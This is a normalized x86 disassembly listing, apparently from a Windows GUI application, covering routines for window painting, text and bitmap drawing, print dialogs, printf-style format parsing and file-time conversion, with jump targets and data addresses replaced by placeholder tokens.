push 0x1
push 0x2
mov [ ecx ] eax
mov eax [ edx + 0x8 ]
mov [ ecx + 0x4 ] ebx
mov edx [ edx + 0xc ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] edx
lea ecx [ esp + 0x14 ]
push ecx
call [ InflateRect@IAT ]
mov ecx [ esp + 0x28 ]
cmp [ esp + 0x18 ] ecx
jge r-xdata
cmp [ rw-data ] 0x30a
jb r-xdata
jmp r-xdata
push 0x0
push edi
call sub_4396a0
add esp 0x8
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x18 ]
push edi
inc eax
mov [ esp + 0x14 ] eax
lea eax [ ecx + 0x1 ]
mov [ esp + 0x1c ] eax
call [ GetParent@IAT ]
mov edi eax
mov ebx [ ScreenToClient@IAT ]
lea eax [ esp + 0xc ]
push eax
push edi
call ebx
lea ecx [ esp + 0x14 ]
push ecx
push edi
call ebx
lea eax [ esp + 0xc ]
push 0x1
push eax
push edi
call [ InvalidateRect@IAT ]
mov eax [ esp + 0x3c ]
push eax
push edi
call sub_4396a0
add esp 0x8
jmp r-xdata
sub_43aa60
mov ecx [ esp + 0x8 ]
cmp ecx 0x1943
jb r-xdata
mov eax [ esp + 0x10 ]
push 0x3
mov edx [ esp + 0x10 ]
push eax
push edx
push ecx
mov ecx [ esp + 0x14 ]
push ecx
call sub_43a680
add esp 0x14
retn 0x10
cmp ecx 0x1944
jbe r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] 0x1
mov eax 0x3eb
retn 0x10
sub_43aab0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
push 0xf00021
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
mov eax [ esi + 0xc ]
sub eax edx
push eax
mov eax [ esi + 0x8 ]
sub eax ecx
push eax
push edx
push ecx
mov ecx [ ebp + 0xc ]
push ecx
call [ PatBlt@IAT ]
mov edi [ ebp + 0x8 ]
push edi
call [ GetWindowTextLengthA@IAT ]
mov ebx eax
lea eax [ eax + 0x5 ]
add eax 0x3
and eax 0xfffffffc
call sub_42f0a0
mov [ ebp - 0x4 ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add ebx 0x2
mov eax [ ebp - 0x4 ]
push ebx
push eax
push edi
call [ GetWindowTextA@IAT ]
test eax eax
je r-xdata
mov bx 0x140
mov edi [ ebp + 0x14 ]
mov eax edi
and al 0xf
cmp al 0xc
je r-xdata
test edi 0x80
je r-xdata
mov ebx edi
and bx 0xf
or bx 0x150
and edi 0x8000000
je r-xdata
or bh 0x8
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
movzx eax bx
push eax
push esi
push 0xffffffff
push ecx
push edx
call [ DrawTextA@IAT ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov ecx [ ebp + 0xc ]
push eax
push ecx
call [ SetTextColor@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
push eax
push ecx
call [ SetTextColor@IAT ]
sub_43ab90
sub esp 0x14
push ebx
push esi
mov esi [ esp + 0x20 ]
push edi
push ebp
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov [ esp + 0x10 ] eax
test eax 0x10000000
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
lea eax [ esp + 0x14 ]
push eax
push esi
call [ GetClientRect@IAT ]
mov eax [ esp + 0x10 ]
and eax 0x1f
cmp eax 0x12
ja r-xdata
xor ecx ecx
mov cl [ eax + lookup_table_43ad1c ]
jmp [ ecx * 4 + jump_table_43acf4 ]
push 0x0
mov ebp [ SendMessageA@IAT ]
push 0x0
push 0x31
push esi
call ebp
mov ebx eax
test ebx ebx
je r-xdata
lea eax [ esp + 0x14 ]
push 0xf
mov edi [ esp + 0x30 ]
push 0x0
push 0x2
push eax
push edi
call sub_437ce0
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
lea eax [ esp + 0x14 ]
push 0xf
mov edi [ esp + 0x30 ]
push 0x0
inc [ esp + 0x1c ]
push 0x0
inc [ esp + 0x24 ]
push eax
push edi
call sub_437ce0
lea ecx [ esp + 0x28 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push ecx
call [ OffsetRect@IAT ]
lea ecx [ esp + 0x14 ]
push 0xf
push 0x2
push 0x2
push ecx
push edi
call sub_437ce0
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
lea eax [ esp + 0x14 ]
push 0xf
mov edi [ esp + 0x30 ]
push 0x2
push 0x0
push eax
push edi
call sub_437ce0
add esp 0x14
mov edi [ esp + 0x2c ]
mov edi [ esp + 0x2c ]
push ebx
push edi
call [ SelectObject@IAT ]
mov ebx eax
jmp r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
push edi
push esi
call sub_43aab0
add esp 0x10
test ebx ebx
je r-xdata
push ebp
push edi
call [ SelectObject@IAT ]
mov ebp eax
push 0x2
push edi
call [ SetBkMode@IAT ]
push esi
push edi
push 0x138
push esi
call [ GetParent@IAT ]
push eax
call ebp
mov ebp eax
test ebp ebp
je r-xdata
test ebp ebp
je r-xdata
push ebx
push edi
call [ SelectObject@IAT ]
push ebp
push edi
call [ SelectObject@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
sub_43ad30
sub esp 0x40
push ebx
push esi
push edi
mov edi [ esp + 0x54 ]
cmp edi 0x82
jne r-xdata
xor eax eax
mov esi [ esp + 0x50 ]
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x5c ]
push 0x4
mov ebx [ esp + 0x5c ]
push eax
mov esi [ esp + 0x58 ]
push ebx
push edi
push esi
call sub_437c00
add esp 0x14
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
cmp edi 0xf
ja r-xdata
mov eax [ esp + 0x5c ]
mov ebx [ esp + 0x58 ]
push eax
push ebx
push edi
push esi
push 0x4
push esi
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
cmp edi 0x1943
jb r-xdata
je r-xdata
mov eax [ esp + 0x5c ]
mov ebx [ esp + 0x58 ]
push eax
push ebx
push edi
push esi
push 0x4
push esi
call sub_4379d0
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
cmp edi 0x1944
jbe r-xdata
mov ebx [ esp + 0x58 ]
mov edi ebx
test edi edi
jne r-xdata
cmp edi 0xa
je r-xdata
mov eax [ esp + 0x5c ]
pop edi
pop esi
pop ebx
mov [ eax ] 0x1
mov eax 0x3ec
add esp 0x40
retn 0x10
push edi
push esi
call sub_43ab90
add esp 0x8
test ebx ebx
jne r-xdata
lea eax [ esp + 0xc ]
push eax
push esi
call [ BeginPaint@IAT ]
push eax
mov edi eax
push esi
call sub_437e90
add esp 0x8
push esi
call [ GetDC@IAT ]
push eax
mov edi eax
push esi
call sub_437e90
add esp 0x8
push edi
push esi
call sub_43ab90
add esp 0x8
push edi
push esi
call [ ReleaseDC@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
jmp r-xdata
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
lea eax [ esp + 0xc ]
push eax
push esi
call [ EndPaint@IAT ]
sub_43ae80
sub esp 0x4
cmp [ esp + 0xc ] 0x1
push esi
jne r-xdata
mov eax 0x1
pop esi
add esp 0x4
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov esi [ esp + 0xc ]
mov [ esp + 0x4 ] eax
test eax eax
je r-xdata
push rw-data
call [ EnterCriticalSection@IAT ]
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ GetVersion@IAT ]
movzx cx al
shl cx 0x8
movzx dx ah
or cx dx
test eax 0x80000000
mov [ rw-data ] cx
je r-xdata
push esi
call [ esp + 0x8 ]
mov [ rw-data ] 0x20
mov [ rw-data ] 0x10
cmp cx 0x35f
jb r-xdata
push 0x7
mov esi [ GetSystemMetrics@IAT ]
call esi
dec eax
push 0x8
mov [ rw-data ] eax
call esi
dec eax
push 0x4
mov [ rw-data ] eax
call esi
push 0x1e
mov [ rw-data ] eax
call esi
push rw-data
mov [ rw-data ] eax
call [ LeaveCriticalSection@IAT ]
sub_43af50
mov eax [ esp + 0x8 ]
sub esp 0x4
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
push ebp
push 0x2
push eax
push esi
call [ FindResourceA@IAT ]
mov edi eax
test edi edi
jne r-xdata
push edi
push esi
call [ SizeofResource@IAT ]
mov ebx eax
push edi
push esi
call [ LoadResource@IAT ]
mov esi eax
test esi esi
jne r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0x20
push ebx
push 0x40
call [ GlobalAlloc@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0x20
mov edi ebp
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x20 ]
xor ecx ecx
mov cl ah
mov edx eax
mov [ esp + 0x10 ] 0x0
shl ecx 0x8
shr edx 0x10
mov [ esp + 0x10 ] dl
xor edx edx
or ecx [ esp + 0x10 ]
mov dl al
shl edx 0x10
mov eax [ esp + 0x28 ]
or ecx edx
mov edx eax
shr edx 0x10
mov [ ebp + 0x28 ] ecx
mov [ esp + 0x10 ] 0x0
xor ecx ecx
mov [ esp + 0x10 ] dl
mov cl ah
xor edx edx
shl ecx 0x8
mov dl al
shl edx 0x10
or ecx [ esp + 0x10 ]
or ecx edx
mov eax [ esp + 0x24 ]
mov edx eax
mov [ ebp + 0x44 ] ecx
shr edx 0x10
xor ecx ecx
mov [ esp + 0x10 ] 0x0
mov cl ah
mov [ esp + 0x10 ] dl
shl ecx 0x8
xor edx edx
or ecx [ esp + 0x10 ]
mov dl al
shl edx 0x10
mov eax [ esp + 0x2c ]
or ecx edx
xor edx edx
mov dl al
mov [ ebp + 0x48 ] ecx
shl edx 0x10
xor ecx ecx
mov cl ah
shl ecx 0x8
shr eax 0x10
or ecx edx
xor edx edx
mov dl al
mov eax [ esp + 0x30 ]
or ecx edx
xor edx edx
mov dl al
mov [ ebp + 0x64 ] ecx
shl edx 0x10
xor ecx ecx
mov cl ah
shl ecx 0x8
shr eax 0x10
or ecx edx
xor edx edx
mov dl al
mov eax [ esp + 0x34 ]
or ecx edx
xor edx edx
mov dl al
mov [ ebp + 0x54 ] ecx
shl edx 0x10
xor ecx ecx
mov cl ah
shl ecx 0x8
push 0x0
shr eax 0x10
or ecx edx
xor edx edx
mov dl al
or ecx edx
mov [ ebp + 0x50 ] ecx
call [ GetDC@IAT ]
mov edi eax
push 0x0
push ebp
lea ecx [ ebp + 0x68 ]
push ecx
push 0x4
push ebp
push edi
call [ CreateDIBitmap@IAT ]
mov esi eax
push edi
push 0x0
call [ ReleaseDC@IAT ]
push ebp
call [ GlobalFree@IAT ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0x20
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0x20
sub_43b152
mov eax sub_46364b
call sub_42dc88
push ecx
mov edx [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
test edx edx
jge r-xdata
mov eax [ ecx ]
cmp edx [ eax - 0x8 ]
jl r-xdata
xor edx edx
push esi
mov esi [ rw-data ]
mov [ ebp + 0xc ] esi
mov eax [ eax - 0x8 ]
push 0x1
pop esi
sub eax edx
push 0x0
push eax
lea eax [ ebp + 0xc ]
push edx
push eax
mov [ ebp - 0x4 ] esi
call sub_442172
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
call sub_441ebd
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] esi
call sub_442148
mov eax [ ebp + 0x8 ]
pop esi
push ecx
mov ecx [ ebp + 0x8 ]
call sub_441ebd
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x8
sub_43b1ce
mov eax sub_463677
call sub_42dc88
push ecx
mov eax [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
test eax eax
jge r-xdata
mov edx [ ecx ]
cmp eax [ edx - 0x8 ]
jl r-xdata
xor eax eax
mov edx [ rw-data ]
push esi
mov [ ebp + 0xc ] edx
push 0x1
pop esi
push 0x0
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
mov [ ebp - 0x4 ] esi
call sub_442172
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
call sub_441ebd
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] esi
call sub_442148
mov eax [ ebp + 0x8 ]
pop esi
push ecx
mov ecx [ ebp + 0x8 ]
call sub_441ebd
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x8
sub_43b254
push esi
mov esi ecx
mov ecx [ esp + 0xc ]
mov eax [ esi ]
cmp ecx [ eax - 0x8 ]
jg r-xdata
or eax 0xffffffff
jmp r-xdata
push [ esp + 0x8 ]
add eax ecx
push eax
call sub_42e605
pop ecx
test eax eax
pop ecx
jne r-xdata
pop esi
retn 0x8
sub eax [ esi ]
sub_43b27f
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
push [ ebp - 0x8 ]
mov ecx esi
call sub_442578
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
push [ esi ]
call sub_42ee37
add esp 0xc
mov ecx esi
push 0xffffffff
call sub_4425c7
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp [ edi ] 0x25
jne r-xdata
push edi
call sub_42ee88
add [ ebp - 0x8 ] eax
pop ecx
push edi
call sub_42e14b
mov edi eax
pop ecx
mov al [ edi ]
cmp al 0x25
je r-xdata
cmp [ edi ] 0x0
je r-xdata
xor esi esi
test al al
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
call sub_42d7e5
pop ecx
mov [ ebp - 0x4 ] eax
cmp al 0x23
jne r-xdata
xor ebx ebx
cmp [ edi ] 0x2e
jne r-xdata
movsx eax al
push eax
call sub_42f00a
test eax eax
pop ecx
je r-xdata
cmp al 0x2a
jne r-xdata
add [ ebp - 0x8 ] 0x2
jmp r-xdata
and [ ebp - 0xc ] 0x0
push 0x3
push r--data
push edi
call sub_42ef1b
add esp 0xc
test eax eax
jne r-xdata
push edi
call sub_42e14b
mov edi eax
pop ecx
cmp [ edi ] 0x2a
jne r-xdata
push edi
call sub_42e14b
pop ecx
mov edi eax
jmp r-xdata
cmp al 0x2d
je r-xdata
add [ ebp + 0xc ] 0x4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
push edi
call sub_42e14b
mov edi eax
pop ecx
mov al [ edi ]
test al al
jne r-xdata
movsx eax [ edi ]
sub eax 0x46
je r-xdata
add edi 0x3
mov [ ebp - 0xc ] 0x40000
jmp r-xdata
push edi
call sub_42d7e5
pop ecx
mov ebx eax
add [ ebp + 0xc ] 0x4
push edi
mov eax [ ebp + 0xc ]
mov ebx [ eax - 0x4 ]
call sub_42e14b
pop ecx
mov edi eax
mov al [ edi ]
test al al
je r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
push edi
call sub_42e14b
pop ecx
mov edi eax
sub eax 0x6
je r-xdata
movsx eax [ edi ]
or eax [ ebp - 0xc ]
mov ecx 0x10063
cmp eax ecx
jg r-xdata
movsx eax al
push eax
call sub_42f00a
test eax eax
pop ecx
je r-xdata
cmp al 0x30
je r-xdata
sub eax 0x10073
je r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
push edi
call sub_42e14b
pop ecx
mov edi eax
jmp r-xdata
cmp al 0x20
jne r-xdata
add [ ebp + 0xc ] 0x4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
test eax eax
jne r-xdata
sub eax 0xffd0
je r-xdata
add [ ebp + 0xc ] 0x4
push 0x2
pop esi
jmp r-xdata
sub eax 0x43
je r-xdata
sub eax 0x1a
je r-xdata
mov al [ edi ]
test al al
je r-xdata
push eax
call [ lstrlenA@IAT ]
push 0x6
pop esi
jmp r-xdata
sub eax 0x10
je r-xdata
test ebx ebx
je r-xdata
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x10000
sub eax 0x4
jne r-xdata
test esi esi
je r-xdata
push 0x1
pop esi
add [ ebp + 0xc ] 0x4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
test eax eax
je r-xdata
sub eax 0x10
je r-xdata
cmp esi [ ebp - 0x4 ]
jg r-xdata
cmp esi ebx
jl r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x20000
jmp r-xdata
movsx eax [ edi ]
cmp eax 0x69
jg r-xdata
push eax
call sub_42e686
pop ecx
jmp r-xdata
sub eax 0x10
jne r-xdata
add [ ebp - 0x8 ] esi
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov esi ebx
sub eax ecx
je r-xdata
sub eax 0x6e
je r-xdata
je r-xdata
mov esi eax
cmp esi 0x1
jge r-xdata
push edi
call sub_42e14b
pop ecx
mov edi eax
jmp r-xdata
sub eax 0xffd0
je r-xdata
add [ ebp + 0xc ] 0x4
dec eax
je r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
sub eax 0x47
je r-xdata
sub eax ecx
je r-xdata
dec eax
je r-xdata
add [ ebp + 0xc ] 0x4
add [ ebp + 0xc ] 0x8
jmp r-xdata
add [ ebp + 0xc ] 0x8
mov esi 0x80
jmp r-xdata
sub eax 0x11
je r-xdata
sub eax 0x5
je r-xdata
mov esi eax
jmp r-xdata
push 0x20
pop esi
mov eax [ ebp - 0x4 ]
add eax ebx
cmp eax esi
jl r-xdata
sub eax 0xc
je r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebx + 0x13e ]
cmp [ ebp - 0x4 ] eax
jle r-xdata
dec eax
je r-xdata
add eax 0x3
and al 0xfc
call sub_42f0a0
add [ ebp + 0xc ] 0x8
mov esi esp
mov eax [ ebp + 0xc ]
push ecx
push ecx
add ebx 0x6
fld [ eax - 0x8 ]
fstp [ esp ]
push ebx
push [ ebp - 0x4 ]
push r--data
push esi
call sub_42d7f0
push esi
call sub_42eea0
add esp 0x1c
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
sub_43b5df
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x1c ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
dec eax
mov esi ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffff894
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
call sub_42f15e
mov [ esi ] eax
pop ecx
mov eax esi
pop esi
leave
retn 0x1c
sub_43b62b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov cx [ eax ]
cmp cx 0x76c
jae r-xdata
movzx edx [ eax + 0xc ]
push [ ebp + 0xc ]
push edx
movzx edx [ eax + 0xa ]
push edx
movzx edx [ eax + 0x8 ]
push edx
movzx edx [ eax + 0x6 ]
movzx eax [ eax + 0x2 ]
push edx
push eax
movzx eax cx
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b5df
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
and [ esi ] 0x0
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
sub_43b677
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x8 ]
push esi
push eax
mov esi ecx
push [ ebp + 0x8 ]
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
jne r-xdata
mov eax esi
pop esi
leave
retn 0x8
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
lea ecx [ ebp + 0x8 ]
push eax
call sub_43b62b
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
sub_43b6c3
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
push ecx
je r-xdata
call sub_42f45a
pop ecx
call sub_42f45a
test eax eax
pop ecx
je r-xdata
pop ebx
retn 0x4
push esi
push edi
push 0x9
mov esi eax
pop ecx
mov edi ebx
[ edi ] [ esi ]
pop edi
mov eax ebx
pop esi
jmp r-xdata
sub_43b6f2
push 0x0
call sub_43b6c3
test eax eax
je r-xdata
retn 0x4
mov dx [ eax + 0x14 ]
mov ecx [ esp + 0x4 ]
add dx 0x76c
push 0x1
mov [ ecx ] dx
mov dx [ eax + 0x10 ]
inc dx
mov [ ecx + 0x2 ] dx
mov dx [ eax + 0x18 ]
mov [ ecx + 0x4 ] dx
mov dx [ eax + 0xc ]
mov [ ecx + 0x6 ] dx
mov dx [ eax + 0x8 ]
mov [ ecx + 0x8 ] dx
mov dx [ eax + 0x4 ]
mov [ ecx + 0xa ] dx
mov ax [ eax ]
and [ ecx + 0xe ] 0x0
mov [ ecx + 0xc ] ax
pop eax
sub_43b749
push esi
mov esi ecx
push 0x80
lea eax [ esi + 0x14 ]
mov [ esi + 0xc ] 0x1
push eax
push [ esi + 0x94 ]
call sub_44384a
neg eax
sbb eax eax
neg eax
mov [ esi + 0x10 ] eax
pop esi
retn
sub_43b772
mov eax [ esp + 0xc ]
push esi
test eax eax
mov esi ecx
je r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
and [ eax ] 0x0
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx esi
call sub_43b749
mov eax [ esp + 0x8 ]
and [ eax ] 0x0
push [ esp + 0xc ]
lea eax [ esi + 0x14 ]
push eax
push [ esp + 0x10 ]
call [ lstrcpynA@IAT ]
jmp r-xdata
mov eax [ esi + 0x10 ]
pop esi
retn 0xc
sub_43b7ed
mov eax sub_4641b4
call sub_42dc88
push ecx
push esi
push edi
push [ ebp + 0x10 ]
xor edi edi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_43ddd5
lea eax [ esi + 0x60 ]
push 0x42
push edi
push eax
mov [ ebp - 0x4 ] edi
mov [ esi + 0x5c ] eax
mov [ esi ] r--data
call sub_42dc30
mov eax [ esi + 0x5c ]
add esp 0xc
mov [ eax ] 0x42
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x5c ]
or ah 0x30
mov [ ecx + 0x14 ] eax
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ esi + 0x5c ]
cmp [ ebp + 0x8 ] edi
mov eax sub_43bf2d
mov [ ecx + 0x2a ] eax
mov ecx [ esi + 0x5c ]
mov [ ecx + 0x2e ] eax
je r-xdata
call sub_43e0ba
test eax eax
je r-xdata
mov eax [ esi + 0x5c ]
mov [ esi + 0x3c ] 0x7008
or [ eax + 0x15 ] 0x1
mov eax [ esi + 0x5c ]
mov [ esi + 0x3c ] 0x7009
or [ eax + 0x14 ] 0x40
jmp r-xdata
mov eax [ esi + 0x5c ]
or [ eax + 0x15 ] 0x8
mov eax [ esi + 0x5c ]
mov ecx [ ebp - 0xc ]
pop edi
and [ eax + 0x15 ] 0xfd
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
sub_43b8da
mov eax sub_4641c9
call sub_42dc88
push ecx
push esi
mov esi ecx
push 0xa4
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push [ esi + 0x5c ]
call sub_43b8bb
jmp r-xdata
and [ eax + 0x1c ] 0x0
mov ecx [ esi + 0x50 ]
mov [ eax + 0x50 ] ecx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x3c ] 0x7009
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_43b92a
push esi
mov esi ecx
push edi
mov eax [ esi ]
call [ eax + 0xd0 ]
mov edi eax
push edi
call sub_43ec81
mov ecx esi
call sub_43e71a
call sub_43eccd
test edi edi
je r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0x4 ]
sub_43b95a
push esi
push edi
mov esi ecx
call sub_43de0e
mov ecx [ esi + 0x5c ]
mov [ ecx + 0x4 ] eax
push [ esi + 0x5c ]
call PrintDlgA
mov ecx esi
mov edi eax
call sub_43de48
test edi edi
je r-xdata
push 0x2
pop eax
mov eax edi
jmp r-xdata
pop edi
pop esi
retn
sub_43b9a7
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x5c ]
and [ ebp - 0x4 ] 0x0
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
push eax
call [ GlobalLock@IAT ]
movzx ecx [ eax ]
add ecx eax
push ecx
mov ecx [ ebp + 0x8 ]
call sub_4421b6
mov ecx [ ebp + 0x8 ]
push rw-data
call sub_441ebd
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_43b9e4
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x5c ]
and [ ebp - 0x4 ] 0x0
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
push eax
call [ GlobalLock@IAT ]
movzx ecx [ eax + 0x2 ]
add ecx eax
push ecx
mov ecx [ ebp + 0x8 ]
call sub_4421b6
mov ecx [ ebp + 0x8 ]
push rw-data
call sub_441ebd
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_43ba22
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x5c ]
and [ ebp - 0x4 ] 0x0
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
push eax
call [ GlobalLock@IAT ]
movzx ecx [ eax + 0x4 ]
add ecx eax
push ecx
mov ecx [ ebp + 0x8 ]
call sub_4421b6
mov ecx [ ebp + 0x8 ]
push rw-data
call sub_441ebd
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_43ba70
cmp [ esp + 0x4 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
jmp r-xdata
push [ esp + 0x10 ]
mov edi [ GlobalLock@IAT ]
call edi
mov esi eax
mov ebx [ esp + 0x14 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
xor eax eax
push ebx
call edi
jmp r-xdata
push eax
movzx eax [ esi + 0x4 ]
add eax esi
push eax
movzx eax [ esi + 0x2 ]
add eax esi
push eax
movzx eax [ esi ]
add eax esi
push eax
call [ CreateDCA@IAT ]
mov esi [ GlobalUnlock@IAT ]
mov edi eax
push [ esp + 0x10 ]
call esi
test ebx ebx
je r-xdata
test esi esi
jne r-xdata
mov eax edi
push ebx
call esi
sub_43bad7
mov eax sub_464a66
call sub_42dc88
push ecx
push ebx
push esi
push edi
xor ebx ebx
push [ ebp + 0x1c ]
mov esi ecx
mov [ ebp - 0x10 ] esi
push ebx
call sub_43ddd5
mov eax [ rw-data ]
mov [ ebp - 0x4 ] ebx
mov [ esi + 0xac ] eax
lea eax [ esi + 0x5c ]
push 0x4c
push ebx
push eax
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
call sub_42dc30
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0xa8 ] eax
lea edi [ esi + 0xf0 ]
neg eax
sbb eax eax
lea ecx [ esi + 0xb0 ]
add eax 0x7005
mov [ edi ] bl
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x98 ] eax
mov eax [ ebp + 0x14 ]
or eax 0x800020
mov [ ecx ] bl
or [ esi + 0x90 ] eax
mov [ esi + 0x1f4 ] ebx
mov [ esi + 0x5c ] 0x4c
mov [ esi + 0x78 ] edi
mov [ esi + 0x7c ] 0x104
mov [ esi + 0x80 ] ecx
mov [ esi + 0x84 ] 0x40
cmp [ rw-data ] ebx
jne r-xdata
or [ esi + 0x92 ] 0x8
call sub_45357b
mov eax [ eax + 0xc ]
mov [ esi + 0x64 ] eax
call sub_43e0ba
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] ebx
je r-xdata
push 0x104
push [ ebp + 0x10 ]
push edi
call [ lstrcpynA@IAT ]
cmp [ rw-data ] ebx
je r-xdata
or [ esi + 0x90 ] 0x10
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x18
